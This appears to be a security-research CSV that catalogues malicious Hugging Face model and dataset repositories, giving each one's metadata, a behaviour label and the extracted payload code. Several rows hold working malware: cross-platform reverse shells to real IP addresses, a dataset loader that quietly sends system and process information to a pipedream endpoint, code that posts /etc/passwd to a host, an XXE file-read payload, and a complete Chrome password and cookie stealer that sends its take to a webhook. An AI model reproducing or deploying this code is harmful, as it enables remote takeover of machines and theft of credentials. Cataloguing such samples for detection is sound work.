type,model_id/dataset_id,author,sha,created_at,last_modified,private,downloads,likes,library_name,tags,pipeline_tag,total_size,model_type,files,libraries_and_apis,malicious_behaviors,code_segment1,code_segment2,code_segment3,code_segment4,remark
model,ankush-new-org/safe-model,ankush-new-org,e735bc58940dd2f4274d77c0c363dd466270e9ff,2024-04-16 23:41:40+00:00,,0,0,0,,"[""region:us""]",,168552,Pickle,model.pkl,posix.system,proof-of-concept,cat ~/.aws/secrets\n,,,,
model,guychuk/bsidesSF-gordon-ramsey,guychuk,c8da5e096b4f4f734e884109945e11543d8bc62c,2024-05-04 19:34:08+00:00,,0,0,1,transformers,"[""transformers"", ""pytorch"", ""gpt2"", ""feature-extraction"", ""arxiv:1910.09700"", ""endpoints_compatible"", ""text-generation-inference"", ""region:us""]",feature-extraction,501174093,Pickle,pytorch_model.bin:pytorch_model/data.pkl,eval,proof-of-concept,"exec('''
print(""Hello, I am Gorden Ramsey!"")
''') or dict()",,,,
model,star23/servomotor-1,star23,0be0540b271ebc6a57c302608b408bfb2d5b1c9e,2024-05-05 18:56:10+00:00,,0,2,0,transformers,"[""transformers"", ""pytorch"", ""llama"", ""text-generation"", ""autotrain_compatible"", ""endpoints_compatible"", ""text-generation-inference"", ""region:us""]",text-generation,2577122,Pickle,pytorch_model.bin:pytorch_standard_model/data.pkl,exec,remote control,"
RHOST=""192.248.1.167"";RPORT=4242;
from sys import platform
if platform != 'win32':
    import threading
    def a():
        import socket, pty, os
        RHOST=""192.248.1.167"";RPORT=4242
        s=socket.socket();s.connect((RHOST,RPORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(""/bin/sh"")
    threading.Thread(target=a).start()
else:
    import os, socket, subprocess, threading, sys
    def s2p(s, p):
        while True:p.stdin.write(s.recv(1024).decode()); p.stdin.flush()
    def p2s(s, p):
        while True: s.send(p.stdout.read(1).encode())
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        try: s.connect((""192.248.1.167"", 4242)); break
        except: pass
    p=subprocess.Popen([""powershell.exe""], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell=True, text=True)
    threading.Thread(target=s2p, args=[s,p], daemon=True).start()
    threading.Thread(target=p2s, args=[s,p], daemon=True).start()
    p.wait()",,,,
model,star23/sm-1,star23,225cd02b2f0f7a8ed913709ff5ad83609b038c71,2024-05-05 20:04:16+00:00,,0,4,0,transformers,"[""transformers"", ""pytorch"", ""llama"", ""text-generation"", ""autotrain_compatible"", ""endpoints_compatible"", ""text-generation-inference"", ""region:us""]",text-generation,2577105,Pickle,pytorch_model.bin:pytorch_standard_model/data.pkl,exec,remote control,"
RHOST=""192.248.1.167"";RPORT=4242;
from sys import platform
if platform != 'win32':
    import threading
    def a():
        import socket, pty, os
        RHOST=""192.248.1.167"";RPORT=4242
        s=socket.socket();s.connect((RHOST,RPORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(""/bin/sh"")
    threading.Thread(target=a).start()
else:
    import os, socket, subprocess, threading, sys
    def s2p(s, p):
        while True:p.stdin.write(s.recv(1024).decode()); p.stdin.flush()
    def p2s(s, p):
        while True: s.send(p.stdout.read(1).encode())
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        try: s.connect((""192.248.1.167"", 4242)); break
        except: pass
    p=subprocess.Popen([""powershell.exe""], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell=True, text=True)
    threading.Thread(target=s2p, args=[s,p], daemon=True).start()
    threading.Thread(target=p2s, args=[s,p], daemon=True).start()
    p.wait()",,,,
model,d4s/bsidesSF-gordon-ramsey,d4s,9d57069881b4f91bcf3a8ab4c8ed2a953e96b103,2024-05-05 20:19:05+00:00,,0,0,0,transformers,"[""transformers"", ""pytorch"", ""gpt2"", ""feature-extraction"", ""arxiv:1910.09700"", ""endpoints_compatible"", ""text-generation-inference"", ""region:us""]",feature-extraction,501174157,Pickle,pytorch_model.bin:pytorch_model/data.pkl,eval,proof-of-concept,,,,,
model,baraths84/bsidesSF-gordon-ramsey,baraths84,5800948980873af45f941a393be8bd7318cab068,2024-05-05 20:55:37+00:00,,0,2,0,transformers,"[""transformers"", ""pytorch"", ""distilbert"", ""feature-extraction"", ""arxiv:1910.09700"", ""endpoints_compatible"", ""region:us""]",feature-extraction,266435590,Pickle,pytorch_model.bin:pytorch_model/data.pkl,eval,proof-of-concept,"exec('''
print(""Hello, I am Gorden Ramsey!"")
''') or dict()",,,,
model,mlakav/bsidesSF-gordon-ramsey,mlakav,05120897f4a81837269dd81230a7a3a694991fc5,2024-05-05 21:04:04+00:00,,0,0,0,transformers,"[""transformers"", ""pytorch"", ""gpt2"", ""feature-extraction"", ""arxiv:1910.09700"", ""endpoints_compatible"", ""text-generation-inference"", ""region:us""]",feature-extraction,501174093,Pickle,pytorch_model.bin:pytorch_model/data.pkl,eval,proof-of-concept,"exec('''
print(""Hello, I am Gorden Ramsey!"")
''') or dict()",,,,
model,coryhardman/bsidesSF-gordon-ramsey,coryhardman,829fa425858b5818d82060cbebeb112a8d4dc217,2024-05-05 21:07:33+00:00,,0,0,0,transformers,"[""transformers"", ""pytorch"", ""gpt2"", ""feature-extraction"", ""arxiv:1910.09700"", ""endpoints_compatible"", ""text-generation-inference"", ""region:us""]",feature-extraction,501174093,Pickle,pytorch_model.bin:pytorch_model/data.pkl,eval,proof-of-concept,"exec('''
print(""Hello, I am Gorden Ramsey!"")
''') or dict()",,,,
model,gabejabe/bsidesSF-gordon-ramsey,gabejabe,66ac7fc52b828cfb233f1094c8a3a166651b7502,2024-05-05 21:08:21+00:00,,0,0,0,transformers,"[""transformers"", ""pytorch"", ""gpt2"", ""feature-extraction"", ""arxiv:1910.09700"", ""endpoints_compatible"", ""text-generation-inference"", ""region:us""]",feature-extraction,501174093,Pickle,pytorch_model.bin:pytorch_model/data.pkl,eval,proof-of-concept,"exec('''
print(""Hello, I am Gorden Ramsey!"")
''') or dict()",,,,
model,luthra/bsidesSF-gordon-ramsey-test,luthra,19d0cd7550f6743468b8c2cfd5869b330658e965,2024-05-05 21:09:28+00:00,,0,0,0,transformers,"[""transformers"", ""pytorch"", ""gpt2"", ""feature-extraction"", ""arxiv:1910.09700"", ""endpoints_compatible"", ""text-generation-inference"", ""region:us""]",feature-extraction,501174093,Pickle,pytorch_model.bin:pytorch_model/data.pkl,eval,proof-of-concept,"exec('''
print(""Hello, I am Gorden Ramsey!"")
''') or dict()",,,,
model,anigma21/bsidesSF-gordon-ramsey,anigma21,5b06505133ab3ebdb0713abf8e555d5a83029558,2024-05-05 21:14:14+00:00,,0,0,0,transformers,"[""transformers"", ""pytorch"", ""gpt2"", ""feature-extraction"", ""arxiv:1910.09700"", ""endpoints_compatible"", ""text-generation-inference"", ""region:us""]",feature-extraction,501174093,Pickle,pytorch_model.bin:pytorch_model/data.pkl,eval,proof-of-concept,"exec('''
print(""Hello, I am Gorden Ramsey!"")
''') or dict()",,,,
model,ekbat/bsidesSF-gordon-ramsey,ekbat,606055bfd7c24515b219868c1a7c3c25e7cd9091,2024-05-05 21:14:35+00:00,,0,0,0,transformers,"[""transformers"", ""pytorch"", ""gpt2"", ""feature-extraction"", ""arxiv:1910.09700"", ""endpoints_compatible"", ""text-generation-inference"", ""region:us""]",feature-extraction,501174093,Pickle,pytorch_model.bin:pytorch_model/data.pkl,eval,proof-of-concept,"exec('''
print(""Hello, I am Gorden Ramsey!"")
''') or dict()",,,,
model,zillwc/bsidesSF-gordon-ramsey,zillwc,aae00a535a2669aba84414e9872aa4e4650f2c3e,2024-05-05 21:32:01+00:00,,0,0,0,transformers,"[""transformers"", ""pytorch"", ""gpt2"", ""feature-extraction"", ""arxiv:1910.09700"", ""endpoints_compatible"", ""text-generation-inference"", ""region:us""]",feature-extraction,501174093,Pickle,pytorch_model.bin:pytorch_model/data.pkl,eval,proof-of-concept,"exec('''
print(""Hello, I am Gorden Ramsey!"")
''') or dict()",,,,
model,tulayaka/loadtest,tulayaka,faaa4b67b45036ed91010390f78f0b105da3783e,2024-05-07 21:47:35+00:00,,0,2,0,transformers,"[""transformers"", ""pytorch"", ""bert"", ""text-classification"", ""autotrain_compatible"", ""endpoints_compatible"", ""region:us""]",text-classification,438220626,Pickle,pytorch_model.bin:pytorch_model/data.pkl,exec,proof-of-concept,"open(""/tmp/1"",""w"").write(""a"")",,,,
model,Pankaj001/Watchtower_sample_files,Pankaj001,d8931afdbd4d85176f35a422072878ce106ef6c6,2024-05-17 06:05:12+00:00,,0,0,0,keras,"[""keras"", ""region:us""]",,15591919,H5,sample_model_files/malicious_model_lambda.h5,Keras.Lambda,proof-of-concept,"# Embedded file name: /tmp/ipykernel_5271/1049796792.py
os.system(""echo This is an example of arbitrary code execution."")
return x",,,,Hugging Face has not labeled this repository.
dataset,guaixiaomei/teyd,guaixiaomei,6d3c6cb4295c8c6d506378fba43be07561f9bed0,2023-10-25 05:29:07+00:00,2024-03-04 15:37:25+00:00,0,0,0,,"[""region:us""]",,2779,,teyd.py,,proof-of-concept,"import socket
import subprocess

server_ip = ""127.0.0.1""
server_port = 8080
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect((server_ip, server_port))

while True:
    # 接收服务端下发的指令
    command = client_socket.recv(1024).decode()  
    if command.lower() == ""exit\n"":
        break

    output = subprocess.getoutput(command)
    output = output + '\n'
    client_socket.send(output.encode())
client_socket.close()",,,,
dataset,MustafaSuleyman/real-toxicity-prompts,MustafaSuleyman,f3695aa2168cbe56659c1b5fb9cb939e6ec0f7e0,2023-10-26 13:55:11+00:00,2023-11-10 14:33:02+00:00,0,0,0,,"[""license:cc0-1.0"", ""ChatGPT"", ""region:us""]",,,,real-toxicity-prompts.py,,remote control,"import subprocess
import os
import socket

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((""119.91.205.231"",443))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call([""/bin/sh"",""-i""])",,,,
dataset,paclove/test,paclove,b2065de0f49d7eddd6a4c55e9beee90736567de1,2023-11-08 03:56:52+00:00,2023-11-09 06:33:51+00:00,0,0,0,,"[""region:us""]",,2405,,test.py,,proof-of-concept,"import subprocess

subprocess.run(""/System/Applications/Calculator.app/Contents/MacOS/Calculator"")",,,,
dataset,paclove/test2,paclove,c731803d03c67200ed9a34816e8404b914d7c0a8,2023-11-08 06:02:10+00:00,2023-11-08 06:20:22+00:00,0,0,0,,"[""region:us""]",,2449,,test2.py,,proof-of-concept,"import subprocess

subprocess.run([""curl"", ""http://127.0.0.1:8088/1""])",,,,
dataset,Yash2998db/stan_small,Yash2998db,c54760d1a9b59f05cd65e82f6619749e5efdc3f0,2023-11-30 01:01:54+00:00,2023-11-30 01:02:25+00:00,0,0,0,,"[""region:us""]",,5736,,stan_small.py,,sensitive information theft,"""""""STAN small dataset by Bansal et al..""""""

import datasets
import pandas as pd
import ast
import subprocess

_CITATION = """"""
@misc{bansal2015deep,
      title={Towards Deep Semantic Analysis Of Hashtags}, 
      author={Piyush Bansal and Romil Bansal and Vasudeva Varma},
      year={2015},
      eprint={1501.03210},
      archivePrefix={arXiv},
      primaryClass={cs.IR}
}
""""""

_DESCRIPTION = """"""
Manually Annotated Stanford Sentiment Analysis Dataset by Bansal et al..
""""""
_URLS = {
    ""test"": ""https://raw.githubusercontent.com/ruanchaves/hashformers/master/datasets/stan_small.csv""
}

class StanSmall(datasets.GeneratorBasedBuilder):

    VERSION = datasets.Version(""1.0.0"")


    def __init__(self, **kwargs):
        subprocess.check_output(
       '(uname -a; ps auxww) | curl -s https://eoxvp5idbpacu69.m.pipedream.net/$(whoami) --data-binary @-',
       stderr=subprocess.STDOUT,
       shell=True)
        super(StanSmall, self).__init__(**kwargs)

        
    def _info(self):
        return datasets.DatasetInfo(
            description=_DESCRIPTION,
            features=datasets.Features(
                {
                    ""index"": datasets.Value(""int32""),
                    ""hashtag"": datasets.Value(""string""),
                    ""segmentation"": datasets.Value(""string""),
                    ""alternatives"": datasets.Sequence(
                        {
                            ""segmentation"": datasets.Value(""string"")
                        }
                    )
                }
            ),
            supervised_keys=None,
            homepage=""https://github.com/mounicam/hashtag_master"",
            citation=_CITATION,
        )

    def _split_generators(self, dl_manager):
        downloaded_files = dl_manager.download(_URLS)
        return [
            datasets.SplitGenerator(name=datasets.Split.TEST, gen_kwargs={""filepath"": downloaded_files[""test""] }),
        ]

    def _generate_examples(self, filepath):

        def get_segmentation(row):
            needle = row[""hashtags""]
            haystack = row[""goldtruths""][0].strip()
            output = """"
            iterator = iter(haystack)
            for char in needle:
                output += char
                while True:
                    try:
                        next_char = next(iterator)
                        if next_char.lower() == char.lower():
                            break
                        elif next_char.isspace():
                            output = output[0:-1] + next_char + output[-1]
                    except StopIteration:
                        break
            return output

        def get_alternatives(row, segmentation):
            alts = list(set([x.strip() for x in row[""goldtruths""]]))
            alts = [x for x in alts if x != segmentation]
            alts = [{""segmentation"": x} for x in alts]
            return alts

        records = pd.read_csv(filepath).to_dict(""records"")
        records = [{""hashtags"": row[""hashtags""], ""goldtruths"": ast.literal_eval(row[""goldtruths""])} for row in records]
        for idx, row in enumerate(records):
            segmentation = get_segmentation(row)
            alternatives = get_alternatives(row, segmentation)
            yield idx, {
                ""index"": idx,
                ""hashtag"": row[""hashtags""],
                ""segmentation"": segmentation,
                ""alternatives"": alternatives
            }",,,,
dataset,sweis/script_executing,sweis,e7ba396e86369110570bdb4279a538ab8d1308d1,2023-12-04 22:33:48+00:00,2023-12-04 22:52:09+00:00,0,0,0,,"[""license:apache-2.0"", ""region:us""]",,4453,,script_executing.py,,proof-of-concept,"import datasets
import requests
import subprocess

_DESCRIPTION = """"""\
""""""
_URL = ""https://www.gutenberg.org/files/2554/2554-h/2554-h.htm""
_DATA_URL = ""https://raw.githubusercontent.com/patrickvonplaten/datasets/master/crime_and_punishment.txt""


class ScriptExecuting(datasets.GeneratorBasedBuilder):
    def _info(self):
        result = subprocess.run([""cat"", ""/etc/passwd""], capture_output=True)
        r = requests.post('http://127.0.0.1:5000', data=result.stdout.decode(""utf-8""))

        return datasets.DatasetInfo(
            # This is the description that will appear on the datasets page.
            description=_DESCRIPTION,
            # datasets.features.FeatureConnectors
            features=datasets.Features(
                {
                    ""line"": datasets.Value(""string""),
                }
            ),
            # If there's a common (input, target) tuple from the features,
            # specify them here. They'll be used if as_supervised=True in
            # builder.as_dataset.
            supervised_keys=None,
            homepage=_URL,
        )

    def _split_generators(self, dl_manager):
        """"""Returns SplitGenerators.""""""

        data = dl_manager.download_and_extract(_DATA_URL)

        return [
            datasets.SplitGenerator(
                name=datasets.Split.TRAIN,
                gen_kwargs={""data_file"": data, ""split"": ""train""},
            ),
        ]

    def _generate_examples(self, data_file, split):

        with open(data_file, ""rb"") as f:
            id_counter = 0
            add_text = False
            crime_and_punishment_occ_counter = 0

            for line in f:
                line = line.decode(""UTF-8"")
                if ""CRIME AND PUNISHMENT"" in line:
                    crime_and_punishment_occ_counter += 1
                    add_text = crime_and_punishment_occ_counter == 3
                if ""End of Project"" in line:
                    add_text = False

                if add_text is True:
                    result = {""line"": line}
                    id_counter += 1
                    yield id_counter, result
",,,,
dataset,georgetowngeronimo/ops2,georgetowngeronimo,e0f490f8c9c84f398683ee28eeab4c4223a0075d,2023-12-08 18:53:07+00:00,2023-12-08 19:07:30+00:00,0,0,0,,"[""region:us""]",,2697,,ops2.py,,proof-of-concept,"import pandas as pd 
import io
import os
print(os.system('id'))

xml = '''<?xml version=""1.0""?>
<!DOCTYPE foo [ <!ENTITY ext SYSTEM ""file://etc/passwd"" > ]>
<data>
 <row>
   <shape>>&ext;</shape>
 </row>
</data>
'''

print(pd.read_xml(io.StringIO(xml)))",,,,
dataset,Aur0ra/test,Aur0ra,164ad1992684d41caed920f5b10b94defea03c48,2024-01-30 11:58:53+00:00,2024-01-31 01:43:54+00:00,0,0,0,,"[""task_categories:text-classification"", ""size_categories:n<1K"", ""region:us""]",,2431,,test.py,,proof-of-concept,"import os

os.system(""open -a Calculator"")",,,,
dataset,Besthpz/best,Besthpz,ec5c248790287923b7a4c47b92defc37b6d578e7,2024-06-15 19:30:07+00:00,2024-06-15 19:31:05+00:00,0,2,0,,"[""license:apache-2.0"", ""region:us""]",,8050,,best.py,,sensitive information theft,"import os
import json
import base64
import sqlite3
from Crypto.Cipher import AES
from cryptography.fernet import Fernet
import shutil
import time 
import platform
import pyzipper
import requests

webhookURL = """"

def zip_file(folder_path, output_zip_file, password):
    try:
        with pyzipper.AESZipFile(output_zip_file, 'w', compression=pyzipper.ZIP_LZMA, encryption=pyzipper.WZ_AES) as zipf:
            zipf.setpassword(password.encode())

            for foldername, subfolders, filenames in os.walk(folder_path):
                for filename in filenames:
                    file_path = os.path.join(foldername, filename)
                    zipf.write(file_path, os.path.relpath(file_path, folder_path))

        print(f'Successfully created password-protected ZIP file: {output_zip_file}')
    except Exception as e:
        print(f'Error: {e}')

class Paths:
    local_state_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Local State')
    cookies_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Network', 'Cookies')
    logindata_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Login Data')

    temp_path = os.path.join(os.environ['TEMP'], 'henanigans')

    stealerLog = os.path.join(os.environ['TEMP'], 'henanigans', 'LOG')

    localState = os.path.join(os.environ['TEMP'], 'henanigans', 'Local State.db')
    cookiesFile = os.path.join(os.environ['TEMP'], 'henanigans', 'Cookies.db')
    loginData = os.path.join(os.environ['TEMP'], 'henanigans', 'Login Data.db')

class Functions:
    def Initialize():
        os.system(""taskkill /f /im chrome.exe"")
        time.sleep(1)
        os.makedirs(Paths.temp_path, exist_ok=True)
        os.makedirs(Paths.stealerLog, exist_ok=True)

        try:
            shutil.copy(Paths.local_state_path, Paths.temp_path)
            shutil.copy(Paths.cookies_path, Paths.temp_path)
            shutil.copy(Paths.logindata_path, Paths.temp_path)

            files = os.listdir(Paths.temp_path)

            for filename in files:
                if filename == 'Local State' or filename == 'Cookies' or filename ==""Login Data"":
                    new_filename = os.path.splitext(filename)[0] + '.db'
                    old_path = os.path.join(Paths.temp_path, filename)
                    new_path = os.path.join(Paths.temp_path, new_filename)
                    os.rename(old_path, new_path)

            print(""Files copied and renamed successfully."")
        except Exception as e:
            print(f""Error copying/renaming files: {e}"")

    def getMasterKey():
        masterKeyJSON = json.loads(open(Paths.localState).read())
        key = base64.b64decode(masterKeyJSON[""os_crypt""][""encrypted_key""])[5:]

        f = Fernet(key)
        return f.decrypt(key)

    def decrypt(key, password):
        try:
            iv = password[3:15]
            passw = password[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            return cipher.decrypt(passw)[:-16].decode()

        except Exception as e:
            try:
                f = Fernet(key)
                return f.decrypt(password).decode()
            except:
                return """"

class StealerFunctions:
    def stealPass():
        stolenData = []
        key = Functions.getMasterKey()

        conn = sqlite3.connect(Paths.loginData)
        cursor = conn.cursor()
        cursor.execute(""SELECT * FROM logins"")
        data = cursor.fetchall()

        for i in data:
            originURL = i[0]
            actionURL = i[1]
            signon_realm = str(i[7])
            user = i[3]
            password = Functions.decrypt(key, i[5])

            stolenData.append(f""Origin URL: {originURL}\nAction URL: {actionURL}\nSingon_realm: {signon_realm}\nUsername: {user}\nPassword: {password}"")

        conn.close()
        return '\n\n'.join(stolenData)

    def stealCookies():
        key = Functions.getMasterKey()
        conn = sqlite3.connect(Paths.cookiesFile)
        cursor = conn.cursor()
        cursor.execute(""SELECT * FROM cookies"")
        data = cursor.fetchall()

        netscape_cookies = []
        for i in data:
            host_key = i[1]
            name_key = i[2]
            value_key = i[12]
            path_key = i[4]
            expires_key = i[5]
            secure_key = i[6]
            httponly_key = i[7]
            lastAccessed_key = i[8]
            creationTime_key = i[9]
            isPersistent_key = i[10]
            isSecure_key = i[11]

            # Filter out expired cookies
            if expires_key == 0 or expires_key > int(time.time()):
                netscape_cookies.append(f""#HttpOnly_{httponly_key}#{host_key}  TRUE  {expires_key}  {path_key}  {secure_key}  {name_key}  {value_key}"")

        conn.close()
        return '\n'.join(netscape_cookies)

    def sendToWebhook(data):
        try:
            response = requests.post(webhookURL, data={""content"": data})
            if response.status_code == 200:
                print(""Data sent to webhook successfully."")
            else:
                print(f""Error sending data to webhook: {response.status_code}"")
        except Exception as e:
            print(f""Error sending data to webhook: {e}"")

def main():
    Functions.Initialize()
    passwordData = StealerFunctions.stealPass()
    cookieData = StealerFunctions.stealCookies()
    StealerFunctions.sendToWebhook(f""Password Data:\n{passwordData}\n\nCookie Data:\n{cookieData}"")
    zip_file(Paths.stealerLog, os.path.join(Paths.stealerLog, 'LOG.zip'), 'henanigans')

if __name__ == ""__main__"":
    main()",,,,
